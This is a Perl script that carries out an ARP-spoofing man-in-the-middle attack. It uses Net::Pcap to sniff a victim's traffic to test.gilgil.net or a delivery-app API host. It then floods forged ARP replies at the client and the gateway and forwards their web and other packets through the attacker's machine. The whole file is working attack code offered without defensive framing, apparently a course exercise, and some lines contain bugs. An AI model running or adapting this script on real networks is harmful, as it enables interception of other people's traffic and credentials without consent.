use Net::Pcap;
use NetPacket::Ethernet qw(:strip);
use NetPacket::IP qw(:strip);
use NetPacket::TCP qw(:strip);
use threads;

my $pcap;
my $err;
my $dev = select_dev();
my $fil = 'host test.gilgil.net or omg-mobile-api.baemin.com';
my @listing = snif_packet($dev);
my %map = make_hash(@listing);
my @route = get_route();
$map->{my_mac} = `ifconfig $dev | grep 'ether ' |awk '{ print \$2}'`;
$map->{my_mac} =~ s/\n//g;
$map->{my_ip} = `ifconfig $dev | grep 'inet ' |awk '{ print \$2}'`;
$map->{my_ip} =~ s/\n| //g;


threads->create(sub {
		while(1){
			send_arp($map->{cli_mac}, $map->{my_mac}, $map->{cli_ip}, $route[0]);
			send_arp($route[1], $map->{my_mac}, $route[0], $map->{cli_ip});
			sleep 3;
			}
			});

spoofing_packet($dev);

pcap_close($pcap);
threads->detach();

sub arp_spoofing{
	my $cnt = 1;
	while($cnt){
		send_arp($map->{cli_mac}, $map->{my_mac}, $map->{cli_ip}, $route[0]);
		send_arp($route[1], $map->{my_mac}, $route[0], $map->{cli_ip});
		$cnt --;
	}
}

sub send_arp{ #dest_mac , $src_mac , $dest_ip, $src_ip 
	my @dest_mac = split (/:/,$_[0]);
	my @src_mac = split (/:/, $_[1]);
	my @dest_ip = split (/\./,$_[2]);
	my @src_ip = split (/\./, $_[3]);

	my $arp_packet .= make_hex(@dest_mac,"mac");
	$arp_packet .= make_hex(@src_mac,"mac");
	$arp_packet .= "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02";
	$arp_packet .= make_hex(@src_mac, "mac");
	$arp_packet .= make_hex(@src_ip, "ip");
	$arp_packet .= make_hex(@dest_mac, "mac");
	$arp_packet .= make_hex(@dest_ip, "ip");
	Net::Pcap::sendpacket($pcap,$arp_packet);
}

sub make_hex{
	my $ret ="";
	my $chk = pop;
	my $tmp;
	foreach(@_){
		if($chk eq "ip"){ $tmp = sprintf("%02x",$_);}
		else { $tmp = $_;}
		$ret .= chr(hex($tmp));
	}
	return $ret;
}

sub spoofing_packet{
	my $filter;
	my $dev = shift;
#	my $filter_str = "dst host not $map->{my_ip} and ether dst $map->{mymac} or dst port 80 or dst port 443 or src port 80 or src port 443";
	
	my $find_packet = pcap_open_live($dev, 65536, 1, 1000, \$err) or die "Can't open device $dev: $err\n";
#	pcap_compile( $find_packet, \$filter, $filter_str, 1, 0 );
#	pcap_setfilter( $find_packet, $filter );

	while(1){
		my ($packet, %header);
		Net::Pcap::pcap_next_ex($find_packet, \%header, \$packet);
		my $ip_obj  = NetPacket::IP->decode( eth_strip($packet) );
		my $eth_obj = NetPacket::Ethernet->decode($packet);
		my $tcp_obj = NetPacket::TCP->decode($ip_obj->{data});

#		if(split_mac($eth_obj->{dest_mac}) eq $map->{my_mac} && $ip_obj->{dest_ip} ne $map->{my_ip}){

			if ($tcp_obj->{dest_port} == 80 || $tcp_obj->{dest_port} == 443){ #redirect packet
				$re_packet = change_dest_mac($packet,$route[1]);
				pcap_sendpacket($find_packet,$re_packet);
#				print "redirect callback server\n";
#				print "port : $tcp_obj->{src_port} >> dest port : $tcp_obj->{dest_port}\n";
#				print "$ip_obj->{src_ip} >> $ip_obj->{dest_ip}\n";
			}
			elsif ($tcp_obj->{src_port} == 80 || $tcp_obj->{src_port} == 443){ #redirect packet
				$re_packet = change_dest_mac($packet,$map->{cli_mac});
				pcap_sendpacket($find_packet,$re_packet);

#				print "redirect callback clinet\n";
#				print "port : $tcp_obj->{src_port} >> dest port : $tcp_obj->{dest_port}\n";
#				print "$ip_obj->{src_ip} >> $ip_obj->{dest_ip}\n";
			
			}
			elsif (split_mac($eth_obj->{dest_mac}) eq $map->{my_mac} && $ip_obj->{dest_ip} ne $map->{my_ip} && $ip_obj->{src_ip} eq $map->{cli_ip}){ #send route packet
				$re_packet = change_dest_mac($packet,$route[1]);
				pcap_sendpacket($find_packet,$re_packet);

#				print "me -> route \n";
#				print "port : $tcp_obj->{src_port} >> dest port : $tcp_obj->{dest_port}\n";
#				print "$ip_obj->{src_ip} >> $ip_obj->{dest_ip}\n";

			}
			elsif ($ip_obj->{dest_ip} ne $map->{my_ip} && split_mac($eth_obj->{dest_mac}) eq $map->{my_mac}){ #send client packet
				$re_packet = change_dest_mac($packet,$map->{cli_mac});
				pcap_sendpacket($find_packet,$re_packet);

#				print "me -> client\n";
#				print "port : $tcp_obj->{src_port} >> dest port : $tcp_obj->{dest_port}\n";
#				print "$ip_obj->{src_ip} >> $ip_obj->{dest_ip}\n";
			}
			else {print : "undefind pcaket \n";}
	}
}

sub change_dest_mac{
	my @tmp = split "",$_[0];
	my @mac = split "",$_[1];
	@hex = ($mac[0].$mac[1] ,$mac[3].$mac[4] ,$mac[6].$mac[7] ,$mac[9].$mac[10] ,$mac[12].$mac[13] ,$mac[15].$mac[16]);
	my $index = 0;
	foreach(@hex){
		$tmp[$index] = chr(hex($_));
		$index++;
	}
	my $ret = sprintf("@tmp");
	$ret =~ s/ //g;
	return $ret
}

sub snif_packet{
	print "Start packet capture \n";
	my @ret;
	my $dev = shift;
	my $filter;
	my $filter_str = "host test.gilgil.net or omg-mobile-api.baemin.com";
	$pcap = pcap_open_live($dev, 65536, 1, 1000, \$err) or die "Can't open device $dev: $err\n";
	pcap_compile( $pcap, \$filter, $filter_str, 1, 0 );
	pcap_setfilter( $pcap, $filter );

	while(1){
		my ($packet, %header);
		Net::Pcap::pcap_next_ex($pcap, \%header, \$packet);
		my $ip_obj  = NetPacket::IP->decode( eth_strip($packet) );
		my $eth_obj = NetPacket::Ethernet->decode($packet);

		if($packet){
			push @ret , $ip_obj->{src_ip};
			push @ret , split_mac($eth_obj->{src_mac});
			push @ret , $ip_obj->{dest_ip};
			push @ret , split_mac($eth_obj->{dest_mac});
			push @ret , $packet;
			last;
		}
	}
	return @ret;
}

sub split_mac{
	my $mac = shift;
	my $ret;
	if (length($mac) == 12){
		@tmp = split "",$mac;
		my $cnt = 5;
		my $flag = 1;
		foreach(@tmp){
			$ret .= $_;
			$flag *= -1;
			if($cnt && $flag > 0){$ret .= ":"; $cnt--;}
		}
	}
	else {
		$mac = "0".$mac;
		@tmp = split "",$mac;
		my $cnt = 5;
		my $flag = 1;
		foreach(@tmp){
			$ret .= $_;
			$flag *= -1;
			if($cnt && $flag > 0){$ret .= ":"; $cnt--;}
		}
	}
	return $ret;
}

sub select_dev{
	my @all_dev = Net::Pcap::findalldevs(\$err);
	my $cnt = 1;
	foreach (@all_dev){
		print "$cnt : $_ \n";
		$cnt ++;
	}
	print "Selcet Device number : ";
	my $ret = <>;
	return $all_dev[$ret-1];
}

sub make_hash{
	my @listing = @_;
	my %map;
	print "1. $listing[0] / $listing[1]\n";
	print "2. $listing[2] / $listing[3]\n";
	print "select server number : ";
	my $cnt = <>;
	if ($cnt == 1 ){
		$map->{ser_ip} = $listing[0];
		$map->{ser_mac} = $listing[1];
		$map->{cli_ip} = $listing[2];
		$map->{cli_mac} = $listing[3];
	}
	elsif ($cnt == 2) {
		$map->{ser_ip} = $listing[2];
		$map->{ser_mac} = $listing[3];
		$map->{cli_ip} = $listing[0];
		$map->{cli_mac} = $listing[1];
	}
	else {print "Err number _ \n";}
	return %map;
}

sub get_route{
	my @ret;
	my $ip;
	my @a  = split "\n",`route get default`; foreach(@a){
		if(/gateway: /){ push @ret, $'; $ip = $'; last; }
	}
	my @b = split "\n",`arp -a`; foreach(@b){
		if(/( \($ip\) at )(.+:..)/) { push @ret, $2; last;}
	}
	return @ret;
}
